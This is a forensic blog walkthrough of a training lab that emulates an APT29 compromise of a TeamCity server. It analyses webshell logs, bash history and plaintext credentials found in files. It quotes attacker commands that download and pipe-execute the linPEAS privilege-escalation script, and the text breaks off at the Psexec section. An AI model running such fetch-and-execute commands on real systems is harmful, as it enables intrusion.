<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/spellzedblog/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/spellzedblog/favicon.ico" -->

<link rel="shortcut icon" type="image/x-icon" href="/spellzedblog/favicon.ico">

<!-- end custom head snippets -->


<!-- SEO tags -->
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>The Bear Necessities | Spellzed</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="The Bear Necessities" />
<meta name="author" content="spellzed" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="XINTRA labs TechTonik DFIR Walkthrough" />
<meta property="og:description" content="XINTRA labs TechTonik DFIR Walkthrough" />
<link rel="canonical" href="http://localhost:4000/spellzedblog/2025/03/03/the-bear-necessities.html" />
<meta property="og:url" content="http://localhost:4000/spellzedblog/2025/03/03/the-bear-necessities.html" />
<meta property="og:site_name" content="Spellzed" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-03-03T08:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="The Bear Necessities" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"spellzed"},"dateModified":"2025-03-03T08:00:00+08:00","datePublished":"2025-03-03T08:00:00+08:00","description":"XINTRA labs TechTonik DFIR Walkthrough","headline":"The Bear Necessities","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/spellzedblog/2025/03/03/the-bear-necessities.html"},"url":"http://localhost:4000/spellzedblog/2025/03/03/the-bear-necessities.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/spellzedblog/">
          <h1>Spellzed</h1>
        </a>
        <h2>Writing about DFIR</h2>

        <section id="downloads">
          
        </section>
        <nav>
            
            <a href="/spellzedblog/index.html">About</a>
            
            <a href="/spellzedblog/blog.html">Blog</a>
            
        </nav>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <small>3 March 2025</small>
<h1>The Bear Necessities</h1>

<p class="view">by spellzed</p>

<ul id="toc" class="toc-list">
<li class="toc-entry toc-h1"><a href="#the-bear-necessities-a-xintra-labs-walkthrough">The Bear Necessities: a XINTRA Labs Walkthrough</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h2"><a href="#case-overview">Case Overview</a></li>
<li class="toc-entry toc-h2"><a href="#lab-environment">Lab Environment</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#lets-go-already-i-can-bear-ly-wait">Let‚Äôs go already, I can bear-ly wait!</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h2"><a href="#summary-of-the-attack">Summary of the attack</a></li>
<li class="toc-entry toc-h2"><a href="#exploiting-teamcity">Exploiting TeamCity</a></li>
<li class="toc-entry toc-h2"><a href="#pivoting-into-the-environment">Pivoting into the Environment</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h3"><a href="#finding-the-fstab-flag">Finding the fstab flag</a></li>
<li class="toc-entry toc-h3"><a href="#finding-codesharemanagementps1">Finding CodeShareManagement.ps1</a></li>
<li class="toc-entry toc-h3"><a href="#finding-_adtoolkit_dontuseps1">Finding _ADToolkit_DontUse.ps1</a></li>
<li class="toc-entry toc-h3"><a href="#psexec-activity">Psexec activity</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#discovering-techtonik">Discovering TechTonik</a></li>
<li class="toc-entry toc-h2"><a href="#setting-up-the-network-for-attack">Setting up the Network for Attack</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h4"><a href="#other-ways-to-determine-mimikatz-activity">Other ways to determine Mimikatz Activity:</a></li>
<li class="toc-entry toc-h4"><a href="#registry-modification">Registry modification</a></li>
<li class="toc-entry toc-h3"><a href="#pivoting-on-the-staging-directory-to-find-more-evil">Pivoting on the Staging Directory to Find more Evil</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#dll-hijacking">DLL Hijacking</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h3"><a href="#sumatrapdfexe">SumatraPDF.exe</a></li>
<li class="toc-entry toc-h3"><a href="#how-does-the-attacker-pivot-to-the-sql-server">How does the attacker pivot to the SQL server?</a></li>
<li class="toc-entry toc-h3"><a href="#why-does-the-actor-use-the-credential-lindonrenae-a-sid-analysis">Why does the actor use the credential lindon.renae? A SID analysis:</a></li>
<li class="toc-entry toc-h3"><a href="#why-would-the-attacker-enable-restricted-admin-mode">Why Would The Attacker enable Restricted Admin Mode?</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#signed-drivers-and-edrsandblast">Signed Drivers and EDRSandblast</a></li>
<li class="toc-entry toc-h2"><a href="#dumping-credentials">Dumping Credentials</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h3"><a href="#investigating-wordexe">Investigating word.exe</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#golden-saml">Golden SAML</a></li>
<li class="toc-entry toc-h2"><a href="#getting-the-goods-out">Getting the Goods Out</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h3"><a href="#activity-spike-1">Activity Spike 1:</a></li>
<li class="toc-entry toc-h3"><a href="#activity-spike-2">Activity Spike 2:</a></li>
<li class="toc-entry toc-h3"><a href="#activity-spike-3">Activity Spike 3:</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#our-grizzly-end">Our Grizzly End</a>
<ul class="toc-sublist">
<li class="toc-entry toc-h3"><a href="#downloads">Downloads</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#sources">Sources</a></li>
</ul><h1 id="the-bear-necessities-a-xintra-labs-walkthrough">
<a class="anchor" href="#the-bear-necessities-a-xintra-labs-walkthrough" aria-hidden="true"><span class="octicon octicon-link"></span></a>The <em>Bear</em> Necessities: a XINTRA Labs Walkthrough</h1>

<p><img src="/spellzedblog/assets/images/cosybear.jpg" alt="Cosy Bear - generated by DALLE" width="70%"></p>

<p>The Threat Actor in focus is <em>APT29</em> a.k.a. <em>Cozy Bear</em>, an activity group often attributed to Russia‚Äôs Foreign Intelligence Service (SVR). On December 13, 2023, the U.S. Cybersecurity &amp; Infrastructure Security Agency (CISA) released an <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a">advisory describing APT29‚Äôs exploitation of CVE-2023-42793</a> in <em>JetBrains TeamCity</em> software which will set the stage for today‚Äôs emulated compromise.</p>

<p>Writing this walkthrough helped me clarify my thought processes and identify areas to improve in my investigations. I‚Äôm super keen to hear from any readers. A link to my completed IR tracker for this lab and the Mitre ATT&amp;CK navigator layer can be found at the end.</p>

<p>This walkthrough doesn‚Äôt just seek to find the flags. My vision was to use the questions as a narrative ‚Äúskeleton‚Äù to navigate the lab and tell the story of TechTonik.</p>

<!-- excerpt-end -->

<p><img src="/spellzedblog/assets/images/cert.png" alt="cert" width="70%"></p>

<h2 id="case-overview">
<a class="anchor" href="#case-overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Case Overview</h2>

<p><strong><a href="#lets-go-already-i-can-bear-ly-wait">Skip the preamble and get straight to the walkthrough here</a></strong>.</p>

<p>We are assuming the role of a DFIR investigator who has been called in to assist the TechTonik SOC team. Our mission is to identify the actions and uncover the motives of the attacker so as to allow for their complete removal from the TechTonik environment.</p>

<p>Luckily for us, TechTonik has a SOC team diligent with their documentation; who readily provide us with the following:</p>

<ul>
  <li>They noticed a new unknown user in their TeamCity server on 2024-05-25.</li>
  <li>The IT administrators also mentioned some suspicious files on the file share (hosted on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>).</li>
  <li>There is a Linux server that requires analysis</li>
  <li>All event logs are sent to an Elastic stack</li>
  <li>Default defender was used and run on the hosts</li>
</ul>

<p>Reading the information about the attacker can give you some hints as to where to look, which might break immersion for any purists out there. It‚Äôs not necessary to read the advisory to be able to do the lab, and not doing so does increase the challenge and the realism. Something I liked however, was how the CISA advisory set the stage for the lab.</p>

<blockquote>
  <p>üí≠ Thought taken shape</p>

  <p>These are sprinkled throughout the walkthrough to give insight into my thought process.
In a software development company, I would expect separate testing environments (DEV, INT, PROD). The network layout allows for an attacker to attempt entry via internet-facing servers.</p>
</blockquote>

<h2 id="lab-environment">
<a class="anchor" href="#lab-environment" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lab Environment</h2>

<p>XINTRA hosts their labs on a Windows 11 AWS VM which already includes the tools, snapshots and evidence required for the investigation. Just one click and the instance will be prepared for you.</p>

<p>The tools provided in the lab are comprehensive and I only used a subset listed here:</p>

<ul>
  <li>CyberChef</li>
  <li>EricZimmerman suite: Timeline Explorer</li>
  <li>SysinternalsSuite: Procmon</li>
  <li>7zip</li>
  <li>Notepad++</li>
</ul>

<h1 id="lets-go-already-i-can-bear-ly-wait">
<a class="anchor" href="#lets-go-already-i-can-bear-ly-wait" aria-hidden="true"><span class="octicon octicon-link"></span></a>Let‚Äôs go already, I can <em>bear</em>-ly wait!</h1>

<h2 id="summary-of-the-attack">
<a class="anchor" href="#summary-of-the-attack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Summary of the attack</h2>

<p><img src="/spellzedblog/assets/images/ttonik-summary-green-1.svg" alt="TechTonik Summary"></p>

<h2 id="exploiting-teamcity">
<a class="anchor" href="#exploiting-teamcity" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploiting TeamCity</h2>

<p><img src="/spellzedblog/assets/images/techtonik.png" alt="TechTonik Network Diagram">
<strong>Figure 1</strong>: TechTonik Network Diagram</p>

<p>Entry points are occasionally referred to as ‚Äúbeachheads‚Äù; Internet-facing systems which attackers can use to pivot into the network. Our beachheads are <strong><code class="language-plaintext highlighter-rouge">TKK-PRX-01</code></strong> and <strong><code class="language-plaintext highlighter-rouge">TKK-DEV-01</code></strong>.</p>

<blockquote>
  <p>üí≠ The Bear Necessities</p>

  <p>When investigating a case, I always check out the network diagram beforehand. Doing so allows me to orientate to key devices such as Domain Controllers (DCs), File Servers (FSs) and the structure of the network. I also identify OSes which informs what tools I might need.</p>
</blockquote>

<p>The beachheads are a common entry point, so our first stop will be <strong><code class="language-plaintext highlighter-rouge">TTK-PRX-01</code></strong>: an nginx proxy running on ubuntu server 22.04 responsible for receiving and routing traffic to <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>.</p>

<p>The nginx logs from <strong><code class="language-plaintext highlighter-rouge">TTK-PRX-01</code></strong> have been ingested into the ELK instance. We know that a new user was created on <strong>2024-05-25</strong> so lets edit the ELK filter to reflect that.</p>

<blockquote>
  <p>üí≠ On filters and filtering</p>

  <p>Filtering can reduce load on your ELK/SIEM but comes at the cost of potentially leaving out key bits of information. I personally prefer checking smaller windows of time and increasing the window if required. In time to come, you will get better with handling time üòâ</p>
</blockquote>

<p>The spike of requests frequently indicates scanning or a brute force attack, so lets filter out some noise and expected activity to identify anomalies.</p>

<p><img src="/spellzedblog/assets/screenshots/figure002.png" alt="figure002">
<strong>Figure 2</strong>: ELK instance showing logs from the NGINX perimeter proxy</p>

<p>Referring to Figure 2,</p>
<ul>
  <li>I filter for HTTP POST requests. The <em>hypothesis</em> being that regular traffic should consist mostly of GET requests.</li>
  <li>I prefer looking at the earliest occurrence of activity first.</li>
  <li>Select columns to help us understand the data.</li>
  <li>This is a HTTP POST request with a 200 response code, signalling it likely succeeded.</li>
  <li>Why would an external IP choose to upload business data this way to the corporate environment?</li>
</ul>

<p>I suspect that a file has been uploaded to the server via HTTP POST requests. Based on what we expect of an attacker, they likely want initial access to issue commands via a webshell.</p>

<p><strong><code class="language-plaintext highlighter-rouge">TTK-PRX-01</code></strong> forwards this request to <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>, so lets pivot to that device. <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> is advertised on the network diagram as a TeamCity Server, so the TeamCity application logs would be my first stop.</p>

<blockquote>
  <p>üí≠ On Unix-like Artefacts Collector (UAC)</p>

  <p>XINTRA has prepared a <em>triage image</em> for <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> using <a href="https://tclahr.github.io/uac-docs/">UAC</a> which is used to capture key artefacts from Linux systems. Think of a triage image as a snapshot of the key forensic artefacts on the device, which may not always be the files themselves.</p>
</blockquote>

<p><img src="/spellzedblog/assets/screenshots/figure003.png" alt="figure003"></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[2024-05-25 01:03:12,499]   INFO - s.buildServer.ACTIVITIES.AUDIT - plugin_uploaded: Plugin "deQch48D" was updated by "user with id=21" with comment "Plugin was uploaded to /home/teamcity/.BuildServer/plugins/deQch48D.zip"
</code></pre></div></div>
<p><strong>Figure 3</strong>: Viewing TeamCity Activity logs in the <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> triage image.</p>

<p>Referring to Figure 3,</p>
<ul>
  <li>This is the directory for the various TeamCity logs</li>
  <li>We see an interesting log matching the same timestamp <code class="language-plaintext highlighter-rouge">2024-05-25 01:02:52</code> and <code class="language-plaintext highlighter-rouge">2024-05-25 01:03:12</code> of the suspicious HTTP POST requests in the nginx access log in <strong><code class="language-plaintext highlighter-rouge">TTK-PRX-01</code></strong>
</li>
  <li>Here we see that a string containing <code class="language-plaintext highlighter-rouge">Plugin "deQch48D" was updated by "user with id=21"</code> which could indicate new user creation.</li>
</ul>

<p>This finding in the activity log matches up with the timestamp in the nginx proxy logs on <strong><code class="language-plaintext highlighter-rouge">TTK-PRX-01</code></strong>, and also with the observations of the TechTonik SOC team.</p>

<p>We now know a user ID created by our likely attacker, their IP <code class="language-plaintext highlighter-rouge">44.222.89[.]156</code> , and the timestamp showing the start of their activity. With some Indicators of Compromise (IoCs) and a promising start, lets add the activity to our IR tracker and continue.</p>

<blockquote>
  <p>üí≠ Heard of the ‚ÄúSpreadsheet of doom‚Äù?</p>

  <p>IR tracker: a fancy way of saying big spreadsheet. It‚Äôs great for tracking and documenting important findings, handing over (and taking over) investigations, orienteering oneself to an incident. I highly recommend taking investigation notes in a standardised format.</p>

  <p>I personally use a slightly modified tracker from <a href="https://www.crowdstrike.com/en-us/blog/crowdstrike-releases-digital-forensics-and-incident-response-tracker/">Crowdstrike</a>.</p>
</blockquote>

<p>We also have a file path <code class="language-plaintext highlighter-rouge">/home/teamcity/.BuildServer/plugins/deQch48D.zip</code>, which means we can investigate our first on-disk artefact of the lab!</p>

<p><img src="/spellzedblog/assets/screenshots/figure004.png" alt="figure004">
<strong>Figure 4</strong>: Analysis of the uploaded plugin</p>

<p>Referring to Figure 4, the expanded archive <code class="language-plaintext highlighter-rouge">deQch48D.zip</code> shows two files,</p>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">.xml</code> file <code class="language-plaintext highlighter-rouge">teamcity-plugin.xml</code> shows a sentence in English that doesn‚Äôt make grammatical sense, a supposed ‚ÄúVendor‚Äù and accompanying url. These would be interesting from a Threat Intelligence (TI) perspective as there could be activity observed in other reported compromised environments that contain similar indicators. This can help the SOC team to clarify the activity group targeting TechTonik.</li>
  <li>The <code class="language-plaintext highlighter-rouge">.jar</code> file <code class="language-plaintext highlighter-rouge">deQch48D.jar</code> begins with the PK file signature, used by <code class="language-plaintext highlighter-rouge">.jar</code> files and other <code class="language-plaintext highlighter-rouge">.zip</code> file formats.</li>
</ul>

<p>The .jar file receives certain parameters: ‚Äúcmd‚Äù, ‚Äúquery‚Äù fed to it from the body of the HTTP POST request. Therefore, we don‚Äôt see the exact commands the attacker sent but we do see variation in the <code class="language-plaintext highlighter-rouge">http.response.body.bytes</code> header values returned by the server, presumably to our attacker.</p>

<p><img src="/spellzedblog/assets/screenshots/figure005.png" alt="figure005">
<strong>Figure 5</strong>: ELK logs highlighting the <code class="language-plaintext highlighter-rouge">http.response.body.bytes</code> header values</p>

<p>The <code class="language-plaintext highlighter-rouge">.jar</code> file also determines if the device is a Windows or Linux device and executes commands accordingly. The obfuscated lines 16 and 18 can be translated from their ASCII values to: <code class="language-plaintext highlighter-rouge">cmd</code>, <code class="language-plaintext highlighter-rouge">/C</code>, and <code class="language-plaintext highlighter-rouge">/bin/bash</code>, <code class="language-plaintext highlighter-rouge">-c</code> to execute commands in their respective environments.</p>

<p>In conclusion, it appears that this is a webshell that our attacker can use for RCE. The web access log entry at <code class="language-plaintext highlighter-rouge">2024-05-25 01:02:52</code> shows a pattern similar to that described in <a href="https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/">Rapid7‚Äôs report of CVE-2024-27198</a>. We observe them likely creating a new admin user (information not visible in the body), and generating a new administrator access token.</p>

<h2 id="pivoting-into-the-environment">
<a class="anchor" href="#pivoting-into-the-environment" aria-hidden="true"><span class="octicon octicon-link"></span></a>Pivoting into the Environment</h2>

<p>After achieving initial access, the attacker will likely attempt to establish a more reliable foothold as their method of access may break or be discovered.</p>

<p>Among other things, UAC will perform several host enumeration commands and save the output to text files named after the respective command run. For example, the output of the command:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps
</code></pre></div></div>

<p>will be saved at <code class="language-plaintext highlighter-rouge">C:\Labs\...\hostname\live_response\process\ps.txt</code>.  Through this, we can see the output of commands run at collection time.</p>

<p>The file <code class="language-plaintext highlighter-rouge">lsof_-nPL.txt</code> lists open files. The flags <code class="language-plaintext highlighter-rouge">-nPL</code> prevent conversion of some user IDs in the output.</p>

<p><img src="/spellzedblog/assets/screenshots/figure006.png" alt="figure006">
<strong>Figure 6</strong>: <code class="language-plaintext highlighter-rouge">lsof_-nPL.txt</code> showing the <code class="language-plaintext highlighter-rouge">.jar</code> file.</p>

<p>We can learn of the process relationship with the help of <code class="language-plaintext highlighter-rouge">pstree -p -n.txt</code> and <code class="language-plaintext highlighter-rouge">top -b -n1.txt</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemd (1)
‚îî‚îÄ‚îÄ sh (1394) (teamcity)
    ‚îî‚îÄ‚îÄ sh (1401) (teamcity)
        ‚îî‚îÄ‚îÄ java (1693) (exited at time of UAC collection)
            ‚îî‚îÄ‚îÄ java (2199) (teamcity)

</code></pre></div></div>
<p><strong>Figure 7</strong>: The process relationship of the java process of interest running on <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong></p>

<p>Through this, we can see that the java process is running as the <code class="language-plaintext highlighter-rouge">teamcity</code> user.</p>

<p>The file <code class="language-plaintext highlighter-rouge">deQch48D.jar</code> unpacks to run at the following directory: <code class="language-plaintext highlighter-rouge">/home/teamcity/.BuildServer/system/caches/plugins.unpacked/deQch48D/server/deQch48D.jar</code>.</p>

<p>We know that the java server attempts to perform RCE through a bash prompt, so my next stop is the <em><code class="language-plaintext highlighter-rouge">.bash_history</code></em> file for the <code class="language-plaintext highlighter-rouge">teamcity</code> user which provides evidence of execution.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nb">sudo </span>su
<span class="nb">cd</span> /tmp/
clear
curl <span class="nt">-L</span> https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
...
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh <span class="nt">-O</span> lp.sh
<span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">chmod</span> +x lp.sh 
./lp.sh 
...
</code></pre></div></div>
<p><strong>Figure 8</strong>: an excerpt of the <code class="language-plaintext highlighter-rouge">.bash_history</code> file for user <code class="language-plaintext highlighter-rouge">teamcity</code></p>

<p>The user <code class="language-plaintext highlighter-rouge">teamcity</code> has attempted to use <code class="language-plaintext highlighter-rouge">wget</code> to retrieve a <a href="https://github.com/peass-ng/PEASS-ng">privilege escalation and enumeration tool ‚ÄúPEASS-ng‚Äù</a> which can be used to enumerate known attack paths on a device. The attacker can then consider the various attack paths presented to them. It looks like the <code class="language-plaintext highlighter-rouge">wget</code> command was the one that output the script to a file, <code class="language-plaintext highlighter-rouge">lp.sh</code>.</p>

<p>Notice the <code class="language-plaintext highlighter-rouge">.bash_history</code> file does not come with any timestamps. <code class="language-plaintext highlighter-rouge">bash</code> is able to record timestamps in Ubuntu but those have to be turned on before they are recorded. Some programs on Linux leave additional artefacts of execution. <code class="language-plaintext highlighter-rouge">wget</code> records files it retrieves in the <a href="https://artefacts.help/linux_wget_hsts_history.html">hidden <code class="language-plaintext highlighter-rouge">.wget-hists</code> file</a>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure009.png" alt="figure009">
<strong>Figure 9</strong>: <code class="language-plaintext highlighter-rouge">.wget-hists</code> file for <code class="language-plaintext highlighter-rouge">teamcity</code></p>

<p>There is only one entry in the file corresponding to <code class="language-plaintext highlighter-rouge">github.com</code> whose epoch tiemstamp translates to <code class="language-plaintext highlighter-rouge">Saturday, May 25, 2024 1:45:43 AM UTC</code>. This fits the timeline of our investigation.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nb">chmod</span> +x lp.sh 
./lp.sh 
./lp.sh <span class="nt">-h</span>
<span class="nb">mkdir </span>lp
<span class="nb">mv </span>lp.sh lp/
<span class="nb">cd </span>lp/
<span class="nb">ls</span>
./lp.sh <span class="nt">-a</span> <span class="nt">-t</span> <span class="nt">-r</span> 
./lp.sh <span class="nt">-a</span> 
<span class="nb">cat</span> /etc/filebeat/filebeat.yml
clear
<span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">rm </span>lp.sh 
<span class="nb">ls</span> <span class="nt">-l</span> /FSCode/
<span class="nb">cd</span> /FSCode
</code></pre></div></div>
<p><strong>Figure 10</strong>: Another excerpt of the <code class="language-plaintext highlighter-rouge">.bash_history</code> file for user <code class="language-plaintext highlighter-rouge">teamcity</code> showing execution of <code class="language-plaintext highlighter-rouge">lp.sh</code></p>

<p>The attacker also creates and later deletes a directory <code class="language-plaintext highlighter-rouge">lp</code> and executes linPEAS from it. We also see them enumerating files in a directory <code class="language-plaintext highlighter-rouge">/FSCode</code>. <code class="language-plaintext highlighter-rouge">/FSCode</code> is the path on <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> that links to a corresponding UNC path on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>. There are a couple of ways to find this UNC path.</p>

<h3 id="finding-the-fstab-flag">
<a class="anchor" href="#finding-the-fstab-flag" aria-hidden="true"><span class="octicon octicon-link"></span></a>Finding the fstab flag</h3>

<p>One way to move forward is to check the contents of <code class="language-plaintext highlighter-rouge">/etc/fstab</code> (<em><strong><code class="language-plaintext highlighter-rouge">f</code></strong>ile <strong><code class="language-plaintext highlighter-rouge">s</code></strong>ystems <strong><code class="language-plaintext highlighter-rouge">tab</code></strong>le</em>) which is a configuration file containing information about mount points, mounted drives and their file systems. This <a href="https://www.baeldung.com/linux/network-drive-etc-fstab">article on baeldung focuses on network drives</a>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure011.png" alt="figure011">
<strong>Figure 11</strong>: The contents of <code class="language-plaintext highlighter-rouge">/etc/fstab</code>.</p>

<p>Here, we find the UNC path mapped to <code class="language-plaintext highlighter-rouge">/FSCode</code> along with a set of <em>cifs</em> (Common Internet File System) credentials. Super handy if you were interested in getting around a network, wouldn‚Äôt you say ü§î?</p>

<p>Notice the <code class="language-plaintext highlighter-rouge">/FSCode</code> directory does not exist on <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>? This could give a hint that it is on a network device. The device <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> is adjacent and might be expected to frequently communicate with <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> due to the nature of TechTonik‚Äôs business. On this device the <code class="language-plaintext highlighter-rouge">C:\Code</code> folder seems to be used in the TechTonik‚Äôs as a working folder. We can see in <code class="language-plaintext highlighter-rouge">C:\Code\fs_management</code> files that shed light on the significance of the <code class="language-plaintext highlighter-rouge">FSCode</code> directory.</p>

<h3 id="finding-codesharemanagementps1">
<a class="anchor" href="#finding-codesharemanagementps1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Finding <code class="language-plaintext highlighter-rouge">CodeShareManagement.ps1</code>
</h3>

<p><img src="/spellzedblog/assets/screenshots/figure012.png" alt="figure012">
<strong>Figure 12</strong>: Finding credentials for <code class="language-plaintext highlighter-rouge">stanley.eugene</code> in <code class="language-plaintext highlighter-rouge">C:\Code\fs_management\CodeShareManagement.ps1</code></p>

<p>Another location to find find the UNC path is in Figure 12, where we can see the mapping of source (on <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>) to destination (on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>), and also the credentials here in plaintext!</p>

<p>(There is also  let me know if you spot it or any other goodies üòâ)</p>

<h3 id="finding-_adtoolkit_dontuseps1">
<a class="anchor" href="#finding-_adtoolkit_dontuseps1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Finding <code class="language-plaintext highlighter-rouge">_ADToolkit_DontUse.ps1</code>
</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">cd </span>adtoolkit/
<span class="nb">ls</span> <span class="nt">-l</span>
less _ADToolkit_DontUse.ps1 
<span class="nb">pwd
head</span> <span class="nt">-n</span> 10 _ADToolkit_DontUse.ps1 
</code></pre></div></div>
<p><img src="/spellzedblog/assets/screenshots/figure013.png" alt="figure013">
<strong>Figure 13</strong>: An excerpt of the <code class="language-plaintext highlighter-rouge">.bash_history</code> file for user <code class="language-plaintext highlighter-rouge">teamcity</code> showing attacker access of <code class="language-plaintext highlighter-rouge">_ADToolkit_DontUse.ps1</code> and the contents of <code class="language-plaintext highlighter-rouge">_ADToolkit_DontUse.ps1</code>.</p>

<p>We have evidence that the attacker accesses <code class="language-plaintext highlighter-rouge">_ADToolkit_DontUse.ps1</code> in the <code class="language-plaintext highlighter-rouge">.bash_history</code> file, so we know the attacker definitely has these credentials.</p>

<blockquote>
  <p>üí≠ File Bintegrity Inspector but the ‚ÄúB‚Äù is silent</p>

  <p>Ah, I love snooping around files. These poor coding practices in TechTonik are also present in reality. Such lapses in information security and similar misconfigurations will certainly be exploited by an attacker.</p>
</blockquote>

<p>We can expect that the attacker will want to utilise these credentials somehow. With that lets filter for <strong>2024-05-25</strong> and <code class="language-plaintext highlighter-rouge">*stanley.eugene*</code> in the windows event log as that‚Äôs where we will observe authentication events.</p>

<blockquote>
  <p>üí≠ Nuances between 4624 and 4776</p>

  <p>Event ID 4624 records successful logins on the target device, while Event ID 4776 records authentication events on <strong>both</strong> workstations/servers and DCs. This is why we see failed 4776 events for <code class="language-plaintext highlighter-rouge">stanley.eugene</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong>, but successful 4776 events on <strong><code class="language-plaintext highlighter-rouge">TTK-DC-01</code></strong> at <code class="language-plaintext highlighter-rouge">2024-05-25 03:56:24</code> to <code class="language-plaintext highlighter-rouge">2024-05-25 04:05:53</code></p>
</blockquote>

<p>We can see different <code class="language-plaintext highlighter-rouge">4624</code> events from <code class="language-plaintext highlighter-rouge">stanley.eugene</code>:</p>

<ul>
  <li>at <code class="language-plaintext highlighter-rouge">2024/05/25 4:05:53</code>, <code class="language-plaintext highlighter-rouge">stanley.eugene</code> logs on from <strong><code class="language-plaintext highlighter-rouge">DESKTOP-WAIFU - 10.0.1.4</code></strong> on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong>
</li>
  <li>at <code class="language-plaintext highlighter-rouge">2024/05/25 5:30:56</code>, <code class="language-plaintext highlighter-rouge">stanley.eugene</code> logs on from <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01 - 10.0.1.5</code></strong> on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>
</li>
  <li>at <code class="language-plaintext highlighter-rouge">2024/05/25 12:17:22</code>, <code class="language-plaintext highlighter-rouge">stanley.eugene</code> logs on from <strong><code class="language-plaintext highlighter-rouge">WORKSTATION - 10.0.1.5</code></strong> on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>
</li>
</ul>

<p>Logon 1 appears to be the real <code class="language-plaintext highlighter-rouge">eugene.stanley</code> while logons 2 and 3 appear to be the attacker pivoting from <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</p>

<h3 id="psexec-activity">
<a class="anchor" href="#psexec-activity" aria-hidden="true"><span class="octicon octicon-link"></span></a>Psexec activity</h3>

<blockquote>
  <p>üí≠ Storage concerns</p>

  <p>In reality, due to noise and storage concerns, these events (Windows Security 5140 and Windows Security 5145) might not be available in your environments.</p>
</blockquote>

